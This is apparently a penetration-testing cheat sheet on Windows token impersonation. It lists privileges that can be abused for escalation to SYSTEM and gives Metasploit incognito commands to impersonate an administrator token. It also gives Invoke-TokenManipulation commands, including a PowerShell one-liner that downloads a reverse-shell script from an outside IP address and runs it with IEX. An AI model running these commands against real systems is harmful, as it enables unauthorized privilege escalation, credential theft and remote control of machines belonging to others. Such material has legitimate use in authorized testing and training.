# Token Impersonation

Token impersonation is a technique through which a Windows local administrator could steal another user’s security token in order to impersonate and effectively execute commands as that user.

That are certain privileges in Windows that, if enabled, could lead to an attacker escalating privileges to SYSTEM or any other user account with an active and valid token on that system, through various tools that have been designed to specifically exploit this vulnerability.

### <mark style="color:orange;">**Exploitable Privileges**</mark>

Certain privileges can be exploited to either escalate privileges directly to SYSTEM or to perform actions that are normally restricted. The privileges listed below can grant direct admin access when exploited:

| Privilege            | Impact | Tool              |
| -------------------- | ------ | ----------------- |
| SeAssignPrimaryToken | Admin  | 3rd party tool    |
| SeImpersonate        | Admin  | 3rd party tool    |
| SeBackupPrivilege    | Admin  | 3rd party tool    |
| SeBackup             | Threat | Built-in commands |
| SeCreateToken        | Admin  | 3rd party tool    |
| SeDebug              | Admin  | PowerShell        |
| SeLoadDriver         | Admin  | 3rd party tool    |
| SeRestore            | Admin  | PowerShell        |
| SeTakeOwnership      | Admin  | Built-in commands |
| SeTcb                | Admin  | 3rd party tool    |

full list is here:

{% embed url="https://github.com/gtworek/Priv2Admin" %}

### <mark style="color:orange;">Using Metasploit</mark>

in your meterpreter shell load incognito module:

```
load incognito
```

list available tokens:

```
list_tokens -u
```

Impersonate Administrator:

```
impersonate_token megacorp\\administrator
```

### <mark style="color:orange;">Invoke-TokenManipulation</mark>

{% embed url="https://github.com/PowerShellMafia/PowerSploit/blob/c7985c9bc31e92bb6243c177d7d1d7e68b6f1816/Exfiltration/Invoke-TokenManipulation.ps1" %}

Invokes token impersonation as a domain user. If this doesn't work you can try impersonating SYSTEM and then dumping credentials using mimikatz.

```
Invoke-TokenManipulation -ImpersonateUser -Username "lab\domainadminuser"

Invoke-TokenManipulation -ImpersonateUser -Username "NT AUTHORITY\SYSTEM"

Get-Process wininit | Invoke-TokenManipulation -CreateProcess "cmd.exe"
```

As a replacement for the last command you could do, but be vary of special characters in the command like `"` and `'`

```
Get-Process wininit | Invoke-TokenManipulation -CreateProcess "Powershell.exe -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://10.7.253.6:82/Invoke-PowerShellTcp.ps1');\"};"
```

## <mark style="color:red;">Other Techniques</mark>

{% embed url="https://steflan-security.com/linux-privilege-escalation-token-impersonation" %}

{% embed url="https://decoder.cloud/2017/12/23/the-lonely-potato" %}
